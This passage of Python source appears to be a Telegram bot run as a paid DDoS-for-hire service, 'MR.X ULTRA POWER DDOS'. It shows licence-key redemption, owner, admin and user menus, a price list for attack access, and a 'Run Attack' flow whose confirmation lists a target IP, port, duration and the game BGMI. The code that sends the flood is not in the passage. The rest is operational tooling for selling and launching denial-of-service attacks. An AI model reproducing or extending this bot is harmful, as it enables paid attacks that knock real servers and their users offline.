            f"🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝘽𝙔: @MRXYTDM\n"
            f"🎯 𝙏𝘼𝙍𝙂𝙀𝙏: {ip}\n"
            f"🔌 𝙋𝙊𝙍𝙏: {port}\n"
            f"⏰ 𝙏𝙄𝙈𝙀: {duration}𝙨\n"
            f"🌎 𝙂𝘼𝙈𝙀: 𝘽𝙂𝙈𝙄",
            parse_mode='Markdown',
            reply_markup=get_approved_keyboard()
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙀𝙧𝙧𝙤𝙧\n\n{str(e)}",
            reply_markup=get_approved_keyboard()
        )
    
    del user_state[user_id]

async def redeem_key_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_state[user_id] = 'awaiting_key'
    await update.message.reply_text("🎟️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙮𝙤𝙪𝙧 𝙠𝙚𝙮:")

async def process_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    key = text.strip()
    
    if key not in data.get("keys", {}):
        await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮.", reply_markup=get_user_keyboard())
        del user_state[user_id]
        return
    
    key_data = data["keys"][key]
    if key_data.get("redeemed"):
        await update.message.reply_text("❌ 𝙏𝙝𝙞𝙨 𝙠𝙚𝙮 𝙝𝙖𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙚𝙚𝙣 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙.", reply_markup=get_user_keyboard())
        del user_state[user_id]
        return
    
    days = key_data.get("days", 0)
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    data["approved_users"][str(user_id)] = {"expiry": expiry, "approved_by": "key"}
    data["keys"][key]["redeemed"] = True
    data["keys"][key]["redeemed_by"] = user_id
    save_data()
    
    await update.message.reply_text(
        f"🎉 𝙆𝙚𝙮 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!\n\n"
        f"✅ 𝙔𝙤𝙪 𝙣𝙤𝙬 𝙝𝙖𝙫𝙚 𝙖𝙘𝙘𝙚𝙨𝙨!\n"
        f"📅 𝙑𝙖𝙡𝙞𝙙 𝙛𝙤𝙧: {days} 𝙙𝙖𝙮𝙨\n"
        f"⏰ 𝙀𝙭𝙥𝙞𝙧𝙚𝙨: {expiry}",
        reply_markup=get_approved_keyboard()
    )
    del user_state[user_id]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"
    
    if is_owner(user_id):
        msg = "🚀 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 🚀\n\n"
        msg += "👑 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙊𝙬𝙣𝙚𝙧!\n\n"
        msg += "🎮 𝙐𝙨𝙚 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙗𝙚𝙡𝙤𝙬:"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        msg = "🚀 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 🚀\n\n"
        msg += "👮 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘼𝙙𝙢𝙞𝙣!\n\n"
        msg += "🎮 𝙐𝙨𝙚 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙗𝙚𝙡𝙤𝙬:"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        msg = f"🚀 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 🚀\n\n"
        msg += f"✅ 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 {user_name}!\n"
        msg += "𝙔𝙤𝙪 𝙖𝙧𝙚 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙\n\n"
        msg += "🎮 𝙐𝙨𝙚 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙗𝙚𝙡𝙤𝙬:"
        keyboard = get_approved_keyboard()
    else:
        msg = "🚀 𝕄ℝ.𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 🚀\n\n"
        msg += "📌 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙩𝙝𝙚 𝘽𝙤𝙩\n"
        msg += "𝙍𝙚𝙙𝙚𝙚𝙢 𝙖 𝙠𝙚𝙮 𝙩𝙤 𝙜𝙚𝙩 𝙖𝙘𝙘𝙚𝙨𝙨.\n\n"
        msg += "💰 𝙋𝙍𝙄𝘾𝙀 𝙇𝙄𝙎𝙏:\n"
        msg += "▫️ 1 𝘿𝙖𝙮    – ₹200 🔥\n"
        msg += "▫️ 1 𝙒𝙚𝙚𝙠   – ₹700 🔥\n"
        msg += "▫️ 1 𝙈𝙤𝙣𝙩𝙝  – ₹1500 🔥\n\n"
        msg += "🛒 𝙏𝙤 𝙋𝙪𝙧𝙘𝙝𝙖𝙨𝙚: @MRXYTDM\n\n"
        msg += "🎮 𝙐𝙨𝙚 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙗𝙚𝙡𝙤𝙬:"
        keyboard = get_user_keyboard()
    
    await update.message.reply_text(msg, reply_markup=keyboard)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if text == "🔁 /start":
        await start(update, context)
        return
    
    if text == "🔐 Login":
        await start_login_flow(update, context)
        return
    
    if text == "🔍 Check Status":
        await check_status(update, context)
        return
    
    if text == "✅ Approve User":
        await approve_user_start(update, context)
        return
    
    if text == "❌ Disapprove User":
        await disapprove_user_start(update, context)
        return
    
    if text == "👮 Add Admin":
        await add_admin_start(update, context)
        return
    
    if text == "🚫 Remove Admin":
        await remove_admin_start(update, context)
        return
    
    if text == "🎟️ Generate Key":
        await gen_key_start(update, context)
        return
    
    if text == "🚀 Run Attack":
        await run_attack(update, context)
        return
    
    if text == "📊 View Stats":
        await show_stats(update, context)
        return
    
    if text == "🔴 Logout":
        await logout_session(update, context)
        return
    
    if text == "⏱️ Cooldown ON/OFF":
        await toggle_cooldown(update, context)
        return
    
    if text == "⏲️ Set Cooldown":
        await set_cooldown_start(update, context)
        return
    
    if text == "📊 My Status":
        await my_status(update, context)
        return
    
    if text == "🎟️ Redeem Key":
        await redeem_key_start(update, context)
        return
    
    if user_id in user_state:
        state = user_state[user_id]
        
        if isinstance(state, dict):
            if state.get('step') == 'waiting_token':
                await enter_token(update, context, text)
                return
            elif state.get('step') == 'waiting_captcha':
                await enter_captcha(update, context, text)
                return
            elif state.get('action') == 'approve':
                await process_approve(update, context, text)
                return
            elif state.get('action') == 'disapprove':
                await process_disapprove(update, context, text)
                return
            elif state.get('action') == 'add_admin':
                await process_add_admin(update, context, text)
                return
            elif state.get('action') == 'remove_admin':
                await process_remove_admin(update, context, text)
                return
            elif state.get('action') == 'gen_key':
                await process_gen_key(update, context, text)
                return
        elif state == 'awaiting_attack':
            await process_attack(update, context)
            return
        elif state == 'awaiting_key':
            await process_redeem(update, context, text)
            return
        elif state == 'awaiting_cooldown':
            await process_set_cooldown(update, context, text)
            return

def main():
    load_data()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 MR.X ULTRA POWER DDOS BOT IS ACTIVE 🔥")
    logger.info("Bot started successfully with cooldown system")
    
    app.run_polling()

if __name__ == '__main__':
    main()